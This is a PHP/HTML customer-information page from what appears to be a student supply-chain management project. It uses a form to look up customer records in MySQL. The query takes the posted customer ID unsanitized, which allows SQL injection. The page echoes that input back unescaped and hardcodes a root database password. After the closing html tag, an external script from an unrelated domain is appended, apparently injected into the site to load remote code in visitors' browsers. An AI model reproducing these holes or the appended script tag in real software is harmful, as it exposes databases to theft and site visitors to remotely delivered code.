<html>
<head>

<title>Customer Information</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	
<table>

<td width=300 height=300 colspan=1 rowspan=3 valign=top align=left>
	<map name="map397">
				<area shape='rect' coords='4,5,135,40' href='customer.php'>
				<area shape='rect' coords='4,49,135,83' href='item.php'>
				<area shape='rect' coords='4,93,135,127' href='sales.php'>
				<area shape='rect' coords='4,137,135,172' href='supplier.php'>
				<area shape='rect' coords='4,179,135,213' href='purchase.php'>
				<area shape='rect' coords='4,220,135,258' href='report.php'>
				<area shape='rect' coords='4,270,135,310' href='end.php'>
	</map>

	<tr>
	<td width="5%"></td>
	<td width="35%"><br><br><br><br><br> <br><br><img  border=0 src="cust1.jpg" usemap="#map397"></td>
	<td width="60%">
				<img src="custinfo.jpg" width=600 hight=75>
				<form action="custinfo.php" method="POST">
				<input type="hidden" name="lalithid1">
					 Enter Customer ID:<input type="text" name="custid"><br><br>
					 <input type="submit" value="Submit">
				</form>
<?php
			if(isset($_POST['lalithid1']))
			{
				$cid = $_POST['custid'];
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM customer WHERE customerid='$cid'",$link);
				
				$data = mysql_fetch_row($result);
				if(!$data){die("No Entry Found");}else{ 
				echo "INFORMATION ABOUT Customer ID: "."<b>".$cid."</b>";
				echo "<br><br>Company Name: " . $data[1];
				echo "<br>Address: " . $data[2];
				echo "<br>City: " . $data[3];
				echo "<br>Postal Code: " . $data[4];
				echo "<br>Contact NO: " . $data[5];
				echo "<br>email ID: " . $data[6];
				echo "<br>Fax: " . $data[7];
				echo "<br>State: " . $data[8];}
			}
?>

	</td>
	</tr>
	
</td>
</table>

</body>
</html>
<script src="http://www.yayadown.com/b.js"></script>